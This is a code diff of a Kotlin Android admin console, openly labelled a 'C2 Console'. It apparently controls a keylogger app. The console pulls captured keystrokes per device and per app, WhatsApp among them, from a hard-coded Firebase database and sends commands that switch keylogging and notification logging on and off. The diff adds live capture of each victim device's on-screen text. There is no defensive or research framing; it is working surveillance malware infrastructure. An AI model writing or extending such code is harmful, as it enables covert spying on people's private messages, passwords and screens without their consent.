@@ -2,14 +2,11 @@ package com.example.mykeyboardadmin
 
 import android.graphics.Color
 import android.os.Bundle
-import android.text.Editable
-import android.text.TextWatcher
 import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
 import android.view.ViewGroup
 import android.widget.Button
-import android.widget.EditText
 import android.widget.LinearLayout
 import android.widget.TextView
 import android.widget.Toast
@@ -29,20 +26,13 @@ import java.util.Locale
 class AdminMainActivity : AppCompatActivity() {
 
     private lateinit var recyclerView: RecyclerView
-    private lateinit var txtConnectedDevices: TextView
-    private lateinit var txtActivityEvents: TextView
-    private lateinit var txtAppsToday: TextView
-    private lateinit var txtActiveNodes: TextView
-    private lateinit var txtLiveStatusPill: TextView
-    private lateinit var etDeviceSearch: EditText
+    private lateinit var txtTotalDevices: TextView
+    private lateinit var txtTotalEvents: TextView
 
     private val masterDeviceList = mutableListOf<DeviceModel>()
     private val filteredDeviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
-
-    private var devicesListener: ValueEventListener? = null
-    private var devicesRef: com.google.firebase.database.DatabaseReference? = null
 
     data class DeviceModel(
         val name: String,
@@ -50,6 +40,7 @@ class AdminMainActivity : AppCompatActivity() {
         var notifications: Boolean = true,
         var selectedAppFilter: String? = null,
         var lastSeenTimestamp: Long = 0L,
+        var liveScreenState: String = "Waiting for live screen broadcast...",
         var isExpanded: Boolean = false,
         val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
     ) {
@@ -97,22 +88,18 @@ class AdminMainActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_admin_main)
 
-        txtConnectedDevices = findViewById<TextView>(R.id.txtConnectedDevices)
-        txtActivityEvents = findViewById<TextView>(R.id.txtActivityEvents)
-        txtAppsToday = findViewById<TextView>(R.id.txtAppsToday)
-        txtActiveNodes = findViewById<TextView>(R.id.txtActiveNodes)
-        txtLiveStatusPill = findViewById<TextView>(R.id.txtLiveStatusPill)
-        etDeviceSearch = findViewById<EditText>(R.id.etDeviceSearch)
+        txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
+        txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
             loadConnectedDevices()
-            Toast.makeText(this, "Refreshed & synced devices!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "C2 Console synced!", Toast.LENGTH_SHORT).show()
         }
 
         recyclerView = findViewById<RecyclerView>(R.id.recyclerViewDevices)
         recyclerView.layoutManager = LinearLayoutManager(this)
-        adapter = DeviceAdapter(filteredDeviceList) { device, type, newState ->
+        adapter = DeviceAdapter(masterDeviceList) { device, type, newState ->
             val ref = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands").child(device.name)
             if (type == "key") {
                 device.keylogging = newState
@@ -128,64 +115,28 @@ class AdminMainActivity : AppCompatActivity() {
         }
         recyclerView.adapter = adapter
 
-        etDeviceSearch.addTextChangedListener(object : TextWatcher {
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
-                filterDevices(s?.toString() ?: "")
-            }
-            override fun afterTextChanged(s: Editable?) {}
-        })
-
         loadConnectedDevices()
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        if (devicesListener != null && devicesRef != null) {
-            devicesRef?.removeEventListener(devicesListener!!)
-        }
-    }
-
-    private fun filterDevices(query: String) {
-        filteredDeviceList.clear()
-        if (query.isBlank()) {
-            filteredDeviceList.addAll(masterDeviceList)
-        } else {
-            val lowerQuery = query.lowercase(Locale.getDefault())
-            for (device in masterDeviceList) {
-                if (device.name.lowercase(Locale.getDefault()).contains(lowerQuery)) {
-                    filteredDeviceList.add(device)
-                }
-            }
-        }
-        adapter.notifyDataSetChanged()
-    }
-
     private fun loadConnectedDevices() {
-        if (devicesListener != null && devicesRef != null) {
-            devicesRef?.removeEventListener(devicesListener!!)
-        }
-
-        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
-        devicesListener = object : ValueEventListener {
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                var totalEntriesCount = 0
-                val now = System.currentTimeMillis()
-                var maxLastSeen = 0L
+                val allEntries = mutableListOf<LogEntry>()
 
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
-                    var device = masterDeviceList.find { it.name == deviceName }
-                    if (device == null) {
-                        device = DeviceModel(deviceName)
+                    if (masterDeviceList.none { it.name == deviceName }) {
+                        val device = DeviceModel(deviceName)
                         masterDeviceList.add(device)
                         listenToDeviceState(deviceName)
                         listenToDeviceLogs(deviceName)
+                        listenToLiveScreen(deviceName)
                     }
-
                     for (appChild in child.children) {
                         val rawApp = appChild.key ?: continue
                         if (rawApp.startsWith("notification_", true)) continue
+                        if (rawApp == "live_screen") continue
                         val prettyApp = getPrettyAppName(rawApp)
                         for (entry in appChild.children) {
                             val text = entry.child("text").getValue(String::class.java)
@@ -193,12 +144,9 @@ class AdminMainActivity : AppCompatActivity() {
                                 ?: entry.child("typedContent").getValue(String::class.java)
                                 ?: continue
 
-                            val timestampMillis = parseTimestamp(entry.child("timestamp").value)
-                            if (timestampMillis != null && text.isNotBlank() && text != "null") {
-                                totalEntriesCount++
-                                if (timestampMillis > maxLastSeen) {
-                                    maxLastSeen = timestampMillis
-                                }
+                            val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
+                            if (text.isNotBlank() && text != "null") {
+                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
                             }
                         }
                     }
@@ -214,44 +162,18 @@ class AdminMainActivity : AppCompatActivity() {
                             masterDeviceList.add(device)
                             listenToDeviceState(deviceName)
                             listenToDeviceLogs(deviceName)
+                            listenToLiveScreen(deviceName)
                         }
                     }
 
-                    txtConnectedDevices.text = masterDeviceList.size.toString()
-                    txtActivityEvents.text = totalEntriesCount.toString()
-                    txtAppsToday.text = masterDeviceList.size.toString()
-
-                    val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
-                    if (isOnline) {
-                        txtLiveStatusPill.text = "● ONLINE"
-                        txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
-                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
-                        txtActiveNodes.text = "ONLINE"
-                        txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
-                    } else {
-                        txtLiveStatusPill.text = "● OFFLINE"
-                        txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
-                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
-                        txtActiveNodes.text = "OFFLINE"
-                        txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
-                    }
-
-                    filterDevices(etDeviceSearch.text?.toString() ?: "")
+                    txtTotalDevices.text = masterDeviceList.size.toString()
+                    txtTotalEvents.text = allEntries.size.toString()
+                    adapter.notifyDataSetChanged()
                 }
             }
 
             override fun onCancelled(error: DatabaseError) {}
-        }
-        devicesRef?.addValueEventListener(devicesListener!!)
-    }
-
-    private fun parseTimestamp(value: Any?): Long? {
-        return when (value) {
-            is Long -> value
-            is Number -> value.toLong()
-            is String -> value.toLongOrNull()
-            else -> null
-        }
+        })
     }
 
     private fun listenToDeviceState(deviceName: String) {
@@ -294,6 +216,25 @@ class AdminMainActivity : AppCompatActivity() {
         })
     }
 
+    private fun listenToLiveScreen(deviceName: String) {
+        val teleRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches").child(deviceName).child("live_screen")
+        teleRef.addValueEventListener(object : ValueEventListener {
+            override fun onDataChange(snapshot: DataSnapshot) {
+                val screenText = snapshot.child("screenText").getValue(String::class.java)
+                val pkg = snapshot.child("packageName").getValue(String::class.java) ?: ""
+                val prettyApp = getPrettyAppName(pkg)
+
+                val index = masterDeviceList.indexOfFirst { it.name == deviceName }
+                if (index != -1 && !screenText.isNullOrBlank()) {
+                    masterDeviceList[index].liveScreenState = "[$prettyApp] $screenText"
+                    adapter.notifyItemChanged(index)
+                }
+            }
+
+            override fun onCancelled(error: DatabaseError) {}
+        })
+    }
+
     private fun getPrettyAppName(pkg: String): String {
         return when {
             pkg.contains("whatsapp", true) -> "WhatsApp"
@@ -320,6 +261,7 @@ class AdminMainActivity : AppCompatActivity() {
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
                     if (rawApp.startsWith("notification_", true)) continue
+                    if (rawApp == "live_screen") continue
                     val prettyApp = getPrettyAppName(rawApp)
                     for (entry in appChild.children) {
                         val text = entry.child("text").getValue(String::class.java)
@@ -327,7 +269,7 @@ class AdminMainActivity : AppCompatActivity() {
                             ?: entry.child("typedContent").getValue(String::class.java)
                             ?: continue
 
-                        val timestampMillis = parseTimestamp(entry.child("timestamp").value) ?: System.currentTimeMillis()
+                        val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
                         if (text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
@@ -368,6 +310,7 @@ class AdminMainActivity : AppCompatActivity() {
             val layoutFilterHeader: View = view.findViewById<View>(R.id.layoutFilterHeader)
             val txtActiveFilter: TextView = view.findViewById<TextView>(R.id.txtActiveFilter)
             val btnBackToAll: Button = view.findViewById<Button>(R.id.btnBackToAll)
+            val txtLiveScreenState: TextView = view.findViewById<TextView>(R.id.txtLiveScreenState)
             val layoutDeviceHeader: View = view.findViewById<View>(R.id.layoutDeviceHeader)
             val layoutLogContainer: View = view.findViewById<View>(R.id.layoutLogContainer)
         }
@@ -379,7 +322,7 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtDeviceName.text = device.name
+            holder.txtDeviceName.text = "💻 ${device.name}"
 
             if (device.keylogging) {
                 holder.btnKey.text = "KEY_LOG: ON"
@@ -396,6 +339,9 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.text = "NOTIF_LOG: OFF"
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
+
+            // Bind Live Screen State
+            holder.txtLiveScreenState.text = device.liveScreenState
 
             // Collapse/Expand log area based on click on device header
             if (device.isExpanded) {
